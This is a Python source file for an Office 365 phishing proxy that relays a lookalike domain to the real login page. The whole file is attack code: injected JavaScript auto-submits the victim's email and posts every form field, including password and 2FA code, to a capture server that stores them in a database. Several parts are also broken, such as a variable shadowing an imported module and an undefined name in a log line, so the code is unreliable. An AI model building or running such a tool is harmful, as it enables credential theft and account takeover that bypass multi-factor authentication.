import argparse
import json
import logging
import os
import sys
from http.server import HTTPServer
from socketserver import ThreadingMixIn
import ssl
from mitmproxy import http, proxy, options
from mitmproxy.tools.dump import DumpMaster
import sqlite3
import threading

# Configure logging
logging.basicConfig(
    filename='o365_phish.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Database setup for captures
def init_db():
    conn = sqlite3.connect('o365_captures.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (timestamp TEXT, username TEXT, password TEXT, 2fa_token TEXT, cookies TEXT, oauth_token TEXT, session_id TEXT, service_name TEXT)''')
    conn.commit()
    conn.close()

# Proxy handler for Office 365
class O365Proxy:
    def __init__(self, config):
        self.config = config
        self.target_domain = config['target_domain']
        self.phishing_domain = config['phishing_domain']
        self.service_name = config['service_name']
        self.capture_rules = config['capture_rules']

    def request(self, flow: http.HTTPFlow) -> None:
        # Redirect requests to the target domain
        if flow.request.host == self.phishing_domain:
            flow.request.host = self.target_domain
            logger.info(f"Redirecting request from {self.phishing_domain} to {self.target_domain}")

    def response(self, flow: http.HTTPFlow) -> None:
        # Inject JavaScript for credential capture and auto-submit
        if flow.request.host == self.target_domain and "text/html" in flow.response.headers.get("content-type", ""):
            html = flow.response.text
            email = flow.request.url.split('#')[-1] if '#' in flow.request.url else ''
            
            # Inject lure metadata
            lure = self.config.get('lure', {})
            og_image = lure.get('og_image', '')
            favicon = lure.get('favicon', '')
            og_title = lure.get('og_title', '')
            og_description = lure.get('og_description', '')

            lure_injection = f"""
            <meta property="og:title" content="{og_title}">
            <meta property="og:description" content="{og_description}">
            <meta property="og:image" content="{og_image}">
            <link rel="icon" href="{favicon}">
            """
            
            # Inject JavaScript for prefill and auto-submit
            js_injection = f"""
            <script>
                // Prefill email
                if (window.location.hash) {{
                    var email = window.location.hash.substring(1);
                    var emailField = document.querySelector('input[name="loginfmt"]');
                    if (emailField) {{
                        emailField.value = email;
                        setTimeout(function() {{
                            var submitButton = document.querySelector('input[type="submit"]');
                            if (submitButton) submitButton.click();
                        }}, 500);
                    }}
                }}
                // Capture password and 2FA
                document.addEventListener('submit', function(e) {{
                    var form = e.target;
                    var data = {{}};
                    for (var element of form.elements) {{
                        if (element.name) data[element.name] = element.value;
                    }}
                    fetch('/capture', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify(data)
                    }});
                }});
            </script>
            """
            html = html.replace('</head>', lure_injection + '</head>')
            html = html.replace('</body>', js_injection + '</body>')
            flow.response.text = html
            logger.info(f"Injected JavaScript into response for {flow.request.url}")

    def capture_data(self, data):
        # Store captured data in SQLite
        conn = sqlite3.connect('o365_captures.db')
        c = conn.cursor()
        c.execute("INSERT INTO captures (timestamp, username, password, 2fa_token, cookies, oauth_token, session_id, service_name) VALUES (datetime('now'), ?, ?, ?, ?, ?, ?, ?)",
                  (data.get('loginfmt', ''), data.get('passwd', ''), data.get('otc', ''), json.dumps({}), '', '', self.service_name))
        conn.commit()
        conn.close()
        logger.info("Captured credentials and 2FA token")

# Threaded HTTP Server for capturing data
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass

class CaptureHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        proxy.capture_data(data)
        self.send_response(200)
        self.end_headers()

# Global proxy instance
proxy = None

def start_capture_server():
    server = ThreadedHTTPServer(('localhost', 8000), CaptureHandler)
    server.serve_forever()

def main():
    global proxy

    # Parse arguments
    parser = argparse.ArgumentParser(description='PhishLink: Advanced Phishing Tool')
    parser.add_argument('--config', required=True, help='Path to the configuration file')
    args = parser.parse_args()

    # Load config
    try:
        with open(args.config, 'r') as f:
            config = json.load(f)
    except Exception as e:
        logger.error(f"Failed to load config file {args.config}: {e}")
        sys.exit(1)

    # Initialize database
    init_db()

    # Set up proxy
    proxy = O365Proxy(config)
    opts = options.Options(listen_host='0.0.0.0', listen_port=config['port'])
    opts.add_option("ssl_insecure", bool, True, "Skip SSL certificate verification")

    # Configure SSL
    try:
        ssl_config = config.get('ssl', {})
        if ssl_config.get('enabled', False):
            cert_path = ssl_config.get('cert_path')
            key_path = ssl_config.get('key_path')
            if not os.path.exists(cert_path) or not os.path.exists(key_path):
                logger.error(f"SSL certificates not found: {cert_path}, {key_path}")
                sys.exit(1)
            opts.add_option("certs", str, f"*= {cert_path}", "SSL certificates")
    except Exception as e:
        logger.error(f"Failed to configure SSL: {e}")
        sys.exit(1)

    # Start proxy
    try:
        mitm_config = proxy.configs.Config.from_options(opts)
        master = DumpMaster(opts)
        master.server = proxy.server.ProxyServer(mitm_config)
        master.addons.add(proxy)
        logger.info(f"Phishing link template: https://{config['phishing_domain']}#{EMAIL}")
        logger.info(f"Proxy running at https://{config['phishing_domain']} on port {config['port']}")
    except Exception as e:
        logger.error(f"Failed to start proxy: {e}")
        sys.exit(1)

    # Start capture server in a separate thread
    capture_thread = threading.Thread(target=start_capture_server, daemon=True)
    capture_thread.start()

    # Run proxy
    try:
        master.run()
    except KeyboardInterrupt:
        logger.info("Shutting down proxy")
        master.shutdown()
    except Exception as e:
        logger.error(f"Proxy error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
